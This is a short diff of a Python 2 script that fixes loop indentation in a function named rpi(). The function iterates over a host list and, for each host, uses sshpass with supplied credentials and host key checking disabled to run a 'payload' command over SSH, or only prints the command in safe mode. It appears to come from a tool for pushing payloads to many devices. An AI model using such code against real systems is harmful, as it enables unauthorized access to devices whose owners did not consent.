@@ -91,12 +91,12 @@ def rpi():
 
 	while i < len(lines):
 		print colored("sending payload to ", "yellow"), colored(lines[i], "yellow")
-	if args.safe:
-		print("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
-	else:
-		os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
-		print("\n")
-	i+=1
+		if args.safe:
+			print("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
+		else:
+			os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
+			print("\n")
+		i+=1
 	exit()
 
 def art():
